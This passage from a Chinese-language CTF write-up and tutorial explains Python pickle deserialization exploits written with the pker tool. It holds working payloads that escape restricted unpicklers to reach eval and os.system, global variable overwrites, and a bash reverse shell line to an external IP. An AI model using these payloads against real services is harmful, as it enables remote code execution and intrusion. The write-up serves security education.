    test="123"
    return test
被解析为：
    b"S'123'\np0\n0g0\n."
#### pker：全局变量覆盖
  * 覆盖直接由执行文件引入的`secret`模块中的`name`与`category`变量：
    secret=GLOBAL('__main__', 'secret') 
    # python的执行文件被解析为__main__对象，secret在该对象从属下
    secret.name='1'
    secret.category='2'
  * 覆盖引入模块的变量：
    game = GLOBAL('guess_game', 'game')
    game.curr_ticket = '123'
接下来会给出一些具体的基本操作的实例。
#### pker：函数执行
  * 通过`b'R'`调用：
    s='whoami'
    system = GLOBAL('os', 'system')
    system(s) # `b'R'`调用
    return
  * 通过`b'i'`调用：
    INST('os', 'system', 'whoami')
  * 通过`b'c'`与`b'o'`调用：
    OBJ(GLOBAL('os', 'system'), 'whoami')
  * 多参数调用函数
    INST('[module]', '[callable]'[, par0,par1...])
    OBJ(GLOBAL('[module]', '[callable]')[, par0,par1...])
#### pker：实例化对象
  * 实例化对象是一种特殊的函数执行
    animal = INST('__main__', 'Animal','1','2')
    return animal
    # 或者
    animal = OBJ(GLOBAL('__main__', 'Animal'), '1','2')
    return animal
  * 其中，python原文件中包含：
    class Animal:
        def __init__(self, name, category):
            self.name = name
            self.category = category
  * 也可以先实例化再赋值：
    animal = INST('__main__', 'Animal')
    animal.name='1'
    animal.category='2'
    return animal
#### 手动辅助
  * 拼接opcode：将第一个pickle流结尾表示结束的`.`去掉，两者拼接起来即可。
  * 建立普通的类时，可以先pickle.dumps，再拼接至payload。
### pker：CTF实战
  * 在实际使用pker时，首先需要有大概的思路，保证能做到手写每一步的opcode，然后使用pker对思路进行实现。
#### Code-Breaking: picklecode
解析思路见前文手写opcode的CTF实战部分，pker代码为：
    getattr=GLOBAL('builtins','getattr')
    dict=GLOBAL('builtins','dict')
    dict_get=getattr(dict,'get')
    glo_dic=GLOBAL('builtins','globals')()
    builtins=dict_get(glo_dic,'builtins')
    eval=getattr(builtins,'eval')
    eval('print("123")')
    return
#### BalsnCTF:pyshv1
题目的`find_class`只允许`sys`模块，并且对象名中不能有`.`号。意图很明显，限制子模块，只允许一级模块。  
`sys`模块有一个字典对象`modules`，它包含了运行时所有py程序所导入的所有模块，并决定了python引入的模块，如果字典被改变，引入的模块就会改变。`modules`中还包括了`sys`本身。我们可以利用自己包含自己这点绕过限制，具体过程为：
  1. 由于`sys`自身被包含在自身的子类里，我们可以利用这点使用`s`赋值，向后递进一级，引入`sys.modules`的子模块：`sys.modules['sys']=sys.modules`，此时就相当于`sys=sys.modules`。这样我们就可以利用原`sys.modules`下的对象了，即`sys.modules.xxx`。 
  2. 首先获取`modules`的`get`函数，然后类似于上一步，再使用`s`把`modules`中的`sys`模块更新为`os`模块：`sys['sys']=sys.get('os')`。
  3. 使用`c`获取`system`，之后就可以执行系统命令了。
整个利用过程还是很巧妙的，pker代码为：
    modules=GLOBAL('sys', 'modules')
    modules['sys']=modules
    modules_get=GLOBAL('sys', 'get')
    os=modules_get('os')
    modules['sys']=os
    system=GLOBAL('sys', 'system')
    system('whoami')
    return
#### BalsnCTF:pyshv2
与v1类似，题目的`find_class`只允许`structs`模块，并且对象名中不能有`.`号，只允许一级模块。其中，`structs`是个空模块。但是在`find_class`中调用了`__import__`函数：
    class RestrictedUnpickler(pickle.Unpickler):
        def find_class(self, module, name):
            if module not in whitelist or '.' in name:
                raise KeyError('The pickle is spoilt :(')
            module = __import__(module) # 注意这里调用了__import__
            return getattr(module, name)
注意python的以下几条性质：
  1. `__builtins__`是所有模块公有的字典，记录所有内建函数，可以通过对`__builtins__`内相应key对应函数的修改劫持相应的函数。由于题目调用了`__import__`函数，我们可以通过修改`__import__`劫持`getattr`函数。
  2. `__dict__`列表储存并决定了一个对象的所有属性，如果其内容被改变，属性也会改变。
  3. `c`的实现过程调用了`find_class`函数（顺带一提，它实际上是先`import`再调用`find_class`，但是由于python的import语句其实是使用了五个参数调用的`__import`，无法利用），而本题的`find_class`中多调用了一次`__imoprt__`，随后调用`getattr`，这包含了一个查值的过程，这一点很重要。
然后我们理一下利用过程：
  1. 目标：`structs.__builtins__['eval']`→需要`structs.__builtins__.get`函数。
  2. 实现二级跳转：劫持`__import__`为`structs.__getattribute__`，opcode`cstructs`变为`structs.__getattribute__(structs).xxx`。
  3. 结合1、2：`structs.__getattribute__(structs)`要返回`structs.__builtins__`；xxx则设置为get。
  4. 利用`structs.__dict__`对`structs`赋值新属性`structs.structs`为`structs.__builtins__`，以便`structs.__getattribute__(structs)`返回`structs.__builtins__`。
pker实现：
    __dict__ = GLOBAL('structs', '__dict__') # structs的属性dict
    __builtins__ = GLOBAL('structs', '__builtins__') # 内建函数dict
    gtat = GLOBAL('structs', '__getattribute__') # 获取structs.__getattribute__
    __builtins__['__import__'] = gtat # 劫持__import__函数
    __dict__['structs'] = __builtins__ # 把structs.structs属性赋值为__builtins__
    builtin_get = GLOBAL('structs', 'get') # structs.__getattribute__('structs').get
    eval = builtin_get('eval') # structs.structs['eval']（即__builtins__['eval']
    eval('print(123)')
    return
#### BalsnCTF:pyshv3
v3的`find_class`与v1类似，并限制了`structs`模块，与v1和v2不同的是，v3的flag是由程序读取的，不用达到RCE权限。关键代码为：
    class Pysh(object):
        def __init__(self):
            self.key = os.urandom(100)
            self.login()
            self.cmds = {
                'help': self.cmd_help,
                'whoami': self.cmd_whoami,
                'su': self.cmd_su,
                'flag': self.cmd_flag,
            }
        def login(self):
            with open('../flag.txt', 'rb') as f:
                flag = f.read()
            flag = bytes(a ^ b for a, b in zip(self.key, flag))
            user = input().encode('ascii')
            user = codecs.decode(user, 'base64')
            user = pickle.loads(user)
            print('Login as ' + user.name + ' - ' + user.group)
            user.privileged = False
            user.flag = flag
            self.user = user
        def run(self):
            while True:
                req = input('$ ')
                func = self.cmds.get(req, None)
                if func is None:
                    print('pysh: ' + req + ': command not found')
                else:
                    func()
        ...
        def cmd_flag(self):
            if not self.user.privileged:
                print('flag: Permission denied')
            else:
                print(bytes(a ^ b for a, b in zip(self.user.flag, self.key)))
    if __name__ == '__main__':
        pysh = Pysh()
        pysh.run()
程序先进行一次pickle反序列化，`self.user.privileged`被设置为`False`，然后进入命令执行循环流程，而且提供`cmd_flag`函数，如果`self.user.privileged`为`True`，就会返回flag。  
当类实现了`__get__`、`__set__`和`__delete__`任一方法时，该类被称为“描述器”类，该类的实例化为描述器。对于一个某属性为描述器的类来说，其实例化的对象在查找该属性或设置属性时将不再通过`__dict__`，而是调用该属性描述器的`__get__`、`__set__`或`__delete__`方法。需要注意的是，一个类必须在声明时就设置属性为描述器，使之成为类属性，而不是对象属性，此时描述器才能起作用。  
所以，如果我们设置`User`类的`__set__`函数，它就成为了描述器；再将它设置为`User`类本身的`privileged`属性时，该属性在赋值时就会调用`__set__`函数而不会被赋值，从而绕过赋值获得flag。  
pker代码为：
    User=GLOBAL('structs','User')
    User.__set__=GLOBAL('structs','User') # 使User成为描述器类
    des=User('des','des') # 描述器
    User.privileged=des # 注意此处必须设置描述器为类的属性，而不是实例的属性
    user=User('hachp1','hachp1') # 实例化一个User对象
    return user
#### watevrCTF-2019: Pickle Store
解析思路见前文手写opcode的CTF实战部分，pker代码为：
    system=GLOBAL('os', 'system')
    system('bash -c "bash -i >& /dev/tcp/192.168.11.21/8888 0>&1"')
    return
#### SUCTF-2019:guess_game
题目是一个猜数字游戏，每次对输入的数据反序列化作为ticket，并与随机生成的ticket进行对比，猜对10次就给flag。`find_class`函数限制了`guess_game`模块并禁止了下划线（魔术方法、变量）：
    class RestrictedUnpickler(pickle.Unpickler):
        def find_class(self, module, name):
            # Only allow safe classes
            if "guess_game" == module[0:10] and "__" not in name:
                return getattr(sys.modules[module], name)
            # Forbid everything else.
            raise pickle.UnpicklingError("global '%s.%s' is forbidden" % (module, name))
直接作弊用pickle改`game.ticket`为猜测的ticket，然后把`win_count`和`round_count`都改为9（因为还要进行一轮，`round_count`必须大于10才会出现输赢判断，而给flag的依据是`win_count`等于10轮），pickle伪代码：
    ticket=INST('guess_game.Ticket','Ticket',(1))
    game=GLOBAL('guess_game','game')
    game.win_count=9
    game.round_count=9
    game.curr_ticket=ticket
    return ticket
#### 高校战疫网络安全分享赛: webtmp
解析思路见前文手写opcode的CTF实战部分，pker代码为：
    secret=GLOBAL('__main__', 'secret') # python的执行文件被解析为__main__对象，secret在该对象从属下
    secret.name='1'
    secret.category='2'
    animal = INST('__main__', 'Animal','1','2')
    return animal
## 后记
  * 为了解决pickle反序列化的问题，官方给出了使用改写 `Unpickler.find_class()` 方法，引入白名单的方式来解决，并且给出警告：对于允许反序列化的对象必须要保持警惕。对于开发者而言，如果实在要给用户反序列化的权限，最好使用双白名单限制`module`和`name`并充分考虑到白名单中的各模块和各函数是否有危险。
  * CTF中，pickle相关的题目一般考察对python本身（如对魔术方法和属性等）的深度理解，利用过程可以很巧妙。
  * 由于pickle“只能赋值，不能查值”的特性，唯一能够根据键值查询的操作就是`find_class`函数，即`c`、`i`等opcode，如何根据特有的魔术方法、属性等找到突破口是关键；此外，在利用过程中，往往会借助`getattr`、`get`等函数。
  * 借助pker可以比较方便的编写pickle的opcode，该工具是做题利器。
  * 本文涉及的CTF题目已整理至github：
## 参考资料
  * [官方文档：pickle --- Python 对象序列化](https://docs.python.org/zh-cn/3/library/pickle.html)
  * [How pickle works in Python](https://rushter.com/blog/pickle-serialization-internals/)
  * [blackhat-Sour Pickle: A serialised exploitation guide in one part](https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf)
  * [一篇文章带你理解漏洞之 Python 反序列化漏洞](https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/)
  * [通过AST来构造Pickle opcode](https://xz.aliyun.com/t/7012)
  * [pker](https://github.com/eddieivan01/pker)
  * [Code-Breaking中的两个Python沙箱](https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html)
  * [从Balsn CTF pyshv学习python反序列化](https://www.smi1e.top/%E4%BB%8Ebalsn-ctf-pyshv%E5%AD%A6%E4%B9%A0python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/)
  * [利用python反序列化覆盖秘钥——watevrCTF-2019: Pickle Store的第二种解法](https://xz.aliyun.com/t/7320)